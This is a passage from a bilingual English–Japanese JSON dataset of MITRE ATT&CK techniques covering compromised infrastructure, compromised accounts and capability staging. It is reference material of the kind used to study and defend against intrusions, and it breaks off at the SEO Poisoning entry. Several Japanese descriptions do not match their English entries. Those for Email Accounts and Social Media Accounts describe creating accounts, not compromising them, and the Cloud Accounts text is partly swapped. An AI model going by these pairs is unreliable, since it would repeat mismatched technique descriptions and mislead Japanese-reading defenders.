                        "description_eng": "Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control.(Citation: TrendMicro EarthLusca 2022) Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるサードパーティのサーバーを侵害する可能性があります。サーバーの使用により、攻撃者は操作を準備、開始、および実行できます。侵害後のアクティビティ中、攻撃者はコマンドアンドコントロールなど、さまざまなタスクにサーバーを利用する可能性があります。(引用: TrendMicro EarthLusca 2022) [サーバー](https://attack.mitre.org/techniques/T1583/004)または[仮想プライベートサーバー](https://attack.mitre.org/techniques/T1583/003)を購入する代わりに、攻撃者は操作をサポートするためにサードパーティのサーバーを侵害する可能性があります。\n\n敵対者はまた、[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)のようなウォータリングホール作戦を支援するためにウェブサーバーを侵害したり、[フィッシング](https://attack.mitre.org/techniques/T1566)作戦を支援するためにメールサーバーを侵害したりすることもあります。"
                    },
                    {
                        "id": "T1584.008",
                        "name_eng": "Network Devices",
                        "name_jp": "ネットワークデバイス",
                        "description_eng": "Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment -- instead leveraging these devices to support additional targeting.\n\nOnce an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566) campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005)) or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659) operations. Adversaries may also be able to harvest reusable credentials (i.e., [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised network devices.\n\nAdversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nCompromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011) activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice GRU 2024)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるサードパーティのネットワークデバイスを侵害する可能性があります。小規模オフィス/ホームオフィス（SOHO）ルーターなどのネットワークデバイスは、攻撃者の最終目標がその環境への[初期アクセス](https://attack.mitre.org/tactics/TA0001)ではなく、代わりにこれらのデバイスを利用して追加のターゲティングをサポートする場合に侵害される可能性があります。\n\n攻撃者が制御を取得すると、侵害されたネットワークデバイスを使用して、[フィッシング](https://attack.mitre.org/techniques/T1566)キャンペーン用のペイロードのホスティング（つまり、[リンクターゲット](https://attack.mitre.org/techniques/T1608/005)）や、[コンテンツインジェクション](https://attack.mitre.org/techniques/T1659)操作の実行に必要なアクセスの有効化など、追加の操作を開始できます。攻撃者はまた、侵害されたネットワークデバイスから再利用可能な資格情報（つまり、[有効なアカウント](https://attack.mitre.org/techniques/T1078)）を収集できる場合もあります。\n\n敵対者は、堅牢なホストベースの防御をサポートしていないインターネットに接続されたエッジデバイスや関連するネットワークアプライアンスを特に標的にすることが多い。(引用：Mandiant Fortinet Zero Day)(引用：Wired Russia Cyberwar)\n\n侵害されたネットワークデバイスは、確立された[プロキシ](https://attack.mitre.org/techniques/T1090)および/または[ボットネット](https://attack.mitre.org/techniques/T1584/005)ネットワークを介した[インフラストラクチャの隠蔽](https://attack.mitre.org/techniques/T1665)など、その後の[コマンドアンドコントロール](https://attack.mitre.org/tactics/TA0011)アクティビティをサポートするために使用される場合があります。(引用: Justice GRU 2024)"
                    },
                    {
                        "id": "T1584.001",
                        "name_eng": "Domains",
                        "name_jp": "ドメイン",
                        "description_eng": "Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account, taking advantage of renewal process gaps, or compromising a cloud service that enables managing domains (e.g., AWS Route53).(Citation: Krebs DNS Hijack 2019)\n\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)\n\nAdversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるドメインやサブドメインをハイジャックする可能性があります。ドメイン登録ハイジャックとは、元の登録者の許可なくドメイン名の登録を変更する行為です。(引用: ICANNDomainNameHijacking) 攻撃者は、ドメインの所有者としてリストされている人物のメールアカウントへのアクセスを取得する可能性があります。その後、攻撃者はパスワードを忘れたと主張してドメイン登録に変更を加えることができます。その他の可能性としては、アカウントへのアクセスを取得するためにドメイン登録ヘルプデスクをソーシャルエンジニアリングしたり、更新プロセスのギャップを利用したり、ドメインの管理を可能にするクラウドサービス（AWS Route53など）を侵害したりすることが含まれます。(引用: Krebs DNS Hijack 2019)\n\nサブドメインハイジャックは、組織が実在しないリソースまたはプロビジョニング解除されたリソースを指すDNSエントリを持っている場合に発生する可能性があります。このような場合、攻撃者はサブドメインを制御して、そのドメインに関連付けられた信頼を利用して操作を実行する可能性があります。(引用: Microsoft Sub Takeover 2020)\n\nドメインを侵害した攻撃者はまた、既存のDNSレコードを維持しながら、制御下にある悪意のあるサブドメインを作成することにより、ドメインシャドウイングを行う可能性があります。サービスが中断されないため、悪意のあるサブドメインは長期間気付かれない可能性があります。(引用: Palo Alto Unit 42 Domain Shadowing 2022)"
                    }
                ]
            },
            {
                "id": "T1586",
                "name_eng": "Compromise Accounts",
                "name_jp": "アカウントの侵害",
                "description_eng": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).",
                "description_jp": "攻撃者は、ターゲティング中に使用できるサービスのアカウントを侵害する可能性があります。ソーシャルエンジニアリングを組み込んだ作戦では、オンラインペルソナの利用が重要になる場合があります。アカウントを作成して育成する（つまり、[アカウントの確立](https://attack.mitre.org/techniques/T1585)）のではなく、攻撃者は既存のアカウントを侵害する可能性があります。既存のペルソナを利用すると、潜在的な被害者が侵害されたペルソナとの関係または知識を持っている場合、ある程度の信頼感が生まれる可能性があります。\n\nアカウントを侵害する方法はさまざまです。例えば、[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)による資格情報の収集、サードパーティサイトからの資格情報の購入、資格情報のブルートフォース（侵害された資格情報ダンプからのパスワードの再利用など）、または資格情報へのアクセスのために従業員、サプライヤー、ビジネスパートナーに金銭を支払うなどです。(引用: AnonHBGary)(引用: Microsoft DEV-0537) アカウントを侵害する前に、攻撃者は偵察を実施して、作戦をさらに進めるためにどのアカウントを侵害するかについての決定を通知する可能性があります。\n\nペルソナは、単一のサイトまたは複数のサイト（Facebook、LinkedIn、Twitter、Googleなど）に存在する場合があります。侵害されたアカウントは追加の開発が必要になる場合があり、これにはプロファイル情報の記入または変更、ソーシャルネットワークのさらなる開発、または写真の組み込みが含まれる場合があります。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage)\n\n敵対者は、侵害したメールアカウントを[情報収集のためのフィッシング](https://attack.mitre.org/techniques/T1598)や[フィッシング](https://attack.mitre.org/techniques/T1566)に直接利用することができる。",
                "subtechniques": [
                    {
                        "id": "T1586.003",
                        "name_eng": "Cloud Accounts",
                        "name_jp": "クラウドアカウント",
                        "description_eng": "Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Additionally, cloud-based messaging services such as Twilio, SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or AWS SES (Simple Email Service) may be leveraged for spam or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)(Citation: Netcraft SendGrid 2024) Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)\n\nA variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) between service providers and their customers.(Citation: MSTIC Nobelium Oct 2021)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるクラウドアカウントを侵害する可能性があります。攻撃者は侵害されたクラウドアカウントを使用して、Dropbox、MEGA、Microsoft OneDrive、AWS S3バケットなどのクラウドストレージサービスを[クラウドストレージへのデータ持ち出し](https://attack.mitre.org/techniques/T1567/002)や[ツールのアップロード](https://attack.mitre.org/techniques/T1608/002)に利用するなど、作戦をさらに進めることができます。クラウドアカウントはまた、[仮想プライベートサーバー](https://attack.mitre.org/techniques/T1583/003)や[サーバーレス](https://attack.mitre.org/techniques/T1583/007)インフラストラクチャなど、インフラストラクチャの取得にも使用できます。クラウドアカウントを確立すると、攻撃者は独自のサーバーを管理することなく高度な機能を開発できる可能性があります。(引用: Awake Security C2 Cloud)\n\n[クラウドアカウント](https://attack.mitre.org/techniques/T1585/003)の作成には、クラウドプロバイダーに登録するために攻撃者が[メールアカウント](https://attack.mitre.org/techniques/T1585/002)を確立することも必要になる場合があります。"
                    },
                    {
                        "id": "T1586.002",
                        "name_eng": "Email Accounts",
                        "name_jp": "メールアカウント",
                        "description_eng": "Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).\n\nA variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566) emails may evade reputation-based email filtering rules.\n\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるメールアカウントを作成する可能性があります。攻撃者は、メールプロバイダーで作成したアカウントを使用して、[情報収集のためのフィッシング](https://attack.mitre.org/techniques/T1598)や[フィッシング](https://attack.mitre.org/techniques/T1566)を実行するなど、作戦をさらに進めることができます。(引用: Mandiant APT1) メールアカウントを確立すると、攻撃者は無料サービス（試用期間など）を悪用して、その後の目的のために[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)を行うこともできます。(引用: Free Trial PurpleUrchin)\n\n攻撃者はまた、[ソーシャルメディアアカウント](https://attack.mitre.org/techniques/T1585/001)の使用などを通じて、メールアカウントを中心としたペルソナを育成し、その後の行動の成功確率を高めるための措置を講じる可能性があります。作成されたメールアカウントは、インフラストラクチャの取得（例：[ドメイン](https://attack.mitre.org/techniques/T1583/001)）にも使用できます。(引用: Mandiant APT1)\n\n作戦を物理的に追跡される可能性を減らすために、攻撃者は使い捨てメールサービスを利用する場合があります。(引用: Trend Micro R980 2016)"
                    },
                    {
                        "id": "T1586.001",
                        "name_eng": "Social Media Accounts",
                        "name_jp": "ソーシャルメディアアカウント",
                        "description_eng": "Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるソーシャルメディアアカウントを作成および育成する可能性があります。攻撃者は、作戦をさらに進めるためのペルソナを構築するために使用できるソーシャルメディアアカウントを作成できます。ペルソナ開発は、そのペルソナまたはIDを使用する作戦の過程で正当性について参照および精査される可能性のある公開情報、プレゼンス、履歴、および適切な所属の開発で構成されます。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage)\n\nソーシャルエンジニアリングを組み込んだ作戦では、ソーシャルメディア上のペルソナの利用が重要になる場合があります。これらのペルソナは架空のものである場合もあれば、実在の人物になりすましている場合もあります。ペルソナは、単一のソーシャルメディアサイトまたは複数のサイト（Facebook、LinkedIn、Twitterなど）に存在する場合があります。ソーシャルメディア上でペルソナを確立するには、それらを本物に見せるための追加のドキュメントの開発が必要になる場合があります。これには、プロファイル情報の記入、ソーシャルネットワークの開発、または写真の組み込みが含まれる場合があります。\n\nペルソナが開発されると、攻撃者はそれを使用して関心のあるターゲットへの接続を作成できます。これらの接続は直接的なものである場合もあれば、他の人を介して接続しようとすることを含む場合もあります。(引用: NEWSCASTER2014)(引用: BlackHatRobinSage) これらのアカウントは、初期アクセス中（例：[サービスを介したスピアフィッシング](https://attack.mitre.org/techniques/T1566/003)）など、攻撃者ライフサイクルの他のフェーズ中に利用される場合があります。"
                    }
                ]
            },
            {
                "id": "T1608",
                "name_eng": "Stage Capabilities",
                "name_jp": "能力のステージング",
                "description_eng": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)\n\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):\n\n* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)\n* Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)\n* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)\n* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)",
                "description_jp": "攻撃者は、ターゲティング中に使用できる機能をアップロード、インストール、またはその他の方法でセットアップする可能性があります。作戦をサポートするために、攻撃者は開発した（[能力の開発](https://attack.mitre.org/techniques/T1587)）または取得した（[能力の取得](https://attack.mitre.org/techniques/T1588)）機能を、制御下にあるインフラストラクチャにステージングする必要がある場合があります。これらの機能は、以前に攻撃者が購入/レンタルした（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)）またはその他の方法で侵害した（[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）インフラストラクチャにステージングされる場合があります。機能はまた、GitHubやPastebinなどのWebサービス、またはユーザーがアプリケーションを簡単にプロビジョニングできるPlatform-as-a-Service（PaaS）製品にステージングされる場合もあります。(引用: Volexity Ocean Lotus November 2020)(引用: Dragos Heroku Watering Hole)(引用: Malwarebytes Heroku Skimmers)(引用: Netskope GCP Redirection)(引用: Netskope Cloud Phishing)\n\n能力のステージングは、次のような、多数の初期アクセスおよび侵害後の行動において攻撃者を支援できます（ただし、これらに限定されません）：\n\n* ユーザーがサイトを閲覧する際に[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)を実行するために必要なWebリソースのステージング。(引用: FireEye CFR Watering Hole 2012)(引用: Gallagher 2015)(引用: ATT ScanBox)\n* スピアフィッシングで使用されるリンクターゲット用のWebリソースのステージング。(引用: Malwarebytes Silent Librarian October 2020)(引用: Proofpoint TA407 September 2019)\n* [イングレスツール転送](https://attack.mitre.org/techniques/T1105)を可能にするために、被害者ネットワークからアクセス可能な場所にマルウェアまたはツールをアップロードする。(引用: Volexity Ocean Lotus November 2020)\n* コマンドアンドコントロールトラフィックを暗号化するために、以前に取得したSSL/TLS証明書をインストールする（例：[非対称暗号化](https://attack.mitre.org/techniques/T1573/002)と[Webプロトコル](https://attack.mitre.org/techniques/T1071/001)）。(引用: DigiCert Install SSL Cert)",
                "subtechniques": [
                    {
                        "id": "T1608.004",
                        "name_eng": "Drive-by Target",
                        "name_jp": "ドライブバイターゲット",
                        "description_eng": "Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).\n\nAdversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including:\n\n* Inserting malicious scripts into web pages or other user controllable web content such as forum posts\n* Modifying script files served to websites from publicly writeable cloud storage buckets\n* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n\nIn addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)\n\nWebsites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",
                        "description_jp": "攻撃者は、通常のブラウジング中にWebサイトにアクセスするシステムに感染させるための運用環境を準備する可能性があります。エンドポイントシステムは、[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)のように、攻撃者が制御するサイトを閲覧することによって侵害される可能性があります。このような場合、通常、ユーザーのWebブラウザが悪用の標的となりますが（多くの場合、サイトにアクセスした後は追加のユーザー操作は必要ありません）、攻撃者は[アプリケーションアクセストークン](https://attack.mitre.org/techniques/T1550/001)などの非悪用的な動作のためにWebサイトを設定することもあります。[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)の前に、攻撃者は攻撃者が制御するサイトを閲覧するユーザーにそのエクスプロイトを配信するために必要なリソースをステージングする必要があります。ドライブバイコンテンツは、取得された（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)）または以前に侵害された（[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）攻撃者が制御するインフラストラクチャにステージングできます。\n\n攻撃者は、[JavaScript](https://attack.mitre.org/techniques/T1059/007)などの悪意のあるWebコンテンツをWebサイトにアップロードまたは注入する可能性があります。(引用: FireEye CFR Watering Hole 2012)(引用: Gallagher 2015) これは、次のようなさまざまな方法で行われる可能性があります。\n\n* Webページやフォーラム投稿などの他のユーザーが制御可能なWebコンテンツへの悪意のあるスクリプトの挿入\n* 公開書き込み可能なクラウドストレージバケットからWebサイトに提供されるスクリプトファイルの変更\n* 悪意のあるWeb広告を作成し、正当な広告プロバイダーを介してWebサイト上の広告スペースを購入する（つまり、[マルバタイジング](https://attack.mitre.org/techniques/T1583/008)）\n\nユーザーのWebブラウザを悪用するためのコンテンツのステージングに加えて、攻撃者は、悪用を試みる前に脆弱であることを確認するために、ユーザーのブラウザをプロファイリングするためのスクリプトコンテンツをステージングする可能性もあります（[被害者ホスト情報の収集](https://attack.mitre.org/techniques/T1592)など）。(引用: ATT ScanBox)\n\n攻撃者によって侵害され、ドライブバイをステージングするために使用されるWebサイトは、政府、特定の業界、または地域など、特定のコミュニティによって訪問されるものである可能性があり、その目標は共通の関心に基づいて特定のユーザーまたはユーザーのセットを侵害することです。この種の標的型キャンペーンは、戦略的Web侵害またはウォータリングホール攻撃と呼ばれます。\n\n攻撃者は、[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)を容易にするために、インフラストラクチャの取得（[ドメイン](https://attack.mitre.org/techniques/T1583/001)）中に、正当なドメインに類似したドメイン（ホモグラフ、タイポスクワッティング、異なるトップレベルドメインなど）を購入する可能性があります。"
                    },
                    {
                        "id": "T1608.005",
                        "name_eng": "Link Target",
                        "name_jp": "リンクターゲット",
                        "description_eng": "Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001).\n\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.(Citation: Kaspersky-masking)(Citation: mandiant-masking)\n\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing)(Citation: Cofense-redirect) In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique) Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.(Citation: Talos IPFS 2022)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるリンクによって参照されるリソースを配置する可能性があります。攻撃者は、情報（資格情報を含む）を漏洩させたり、[悪意のあるリンク](https://attack.mitre.org/techniques/T1204/001)のように実行を取得したりするために、ユーザーが悪意のあるリンクをクリックすることに依存する場合があります。リンクは、ユーザーを積極的にクリックさせたり、URLをブラウザにコピーして貼り付けさせたりするために、ソーシャルエンジニアリングテキストを伴うメールを送信するなど、スピアフィッシングに使用できます。情報のためのフィッシング（[スピアフィッシングリンク](https://attack.mitre.org/techniques/T1598/003)など）またはシステムへの初期アクセスを取得するためのフィッシング（[スピアフィッシングリンク](https://attack.mitre.org/techniques/T1566/002)など）の前に、攻撃者はスピアフィッシングリンクのリンクターゲット用のリソースを設定する必要があります。\n\n通常、リンクターゲットのリソースは、ユーザーに提供するコンテンツを決定するために[JavaScript](https://attack.mitre.org/techniques/T1059/007)などのクライアント側スクリプトを含む可能性のあるHTMLページになります。攻撃者は、リンクターゲットとして機能するために正当なサイトを複製する可能性があり、これには[スピアフィッシングリンク](https://attack.mitre.org/techniques/T1598/003)中に資格情報を収集するために、正当なWebサービスまたは組織のログインページの複製が含まれる場合があります。(引用: Malwarebytes Silent Librarian October 2020)(引用: Proofpoint TA407 September 2019) 攻撃者はまた、[マルウェアのアップロード](https://attack.mitre.org/techniques/T1608/001)を行い、ユーザーによるダウンロード/実行のためにリンクターゲットをマルウェアにポイントさせることもあります。\n\n敵対者は、[悪意のあるリンク](https://attack.mitre.org/techniques/T1204/001)を容易にするために、インフラストラクチャの取得（[ドメイン](https://attack.mitre.org/techniques/T1583/001)）中に、正当なドメインに類似したドメイン（例：ホモグラフ、タイポスクワッティング、異なるトップレベルドメインなど）を購入する可能性があります。\n\nリンクは、URLスキーマを悪用し、フィッシングの有効性を高めることで被害者を欺くために、真の宛先を隠すように敵対者によって記述されることがあります。(引用：Kaspersky-masking)(引用：mandiant-masking)\n\n攻撃者はまた、リンク短縮サービスやPlatform-as-a-Serviceプロバイダーの無料または有料アカウントを使用してリンクターゲットをホストし、被害者を悪意のあるページにリダイレクトしながらブロックされるのを避けるために、これらのプロバイダーの広く信頼されているドメインを利用する可能性があります。(引用: Netskope GCP Redirection)(引用: Netskope Cloud Phishing)(引用: Intezer App Service Phishing)(引用: Cofense-redirect) さらに、攻撃者は一意に生成されたURI/URL（ワンタイム、シングルユースリンクを含む）を介してさまざまな悪意のあるリンクを提供する可能性があります。(引用: iOS URL Scheme)(引用: URI)(引用: URI Use)(引用: URI Unique) 最後に、攻撃者はInterPlanetary File System（IPFS）の分散型の性質を利用して、削除が困難なリンクターゲットをホストする可能性があります。(引用: Talos IPFS 2022)"
                    },
                    {
                        "id": "T1608.006",
                        "name_eng": "SEO Poisoning",
                        "name_jp": "SEOポイズニング",
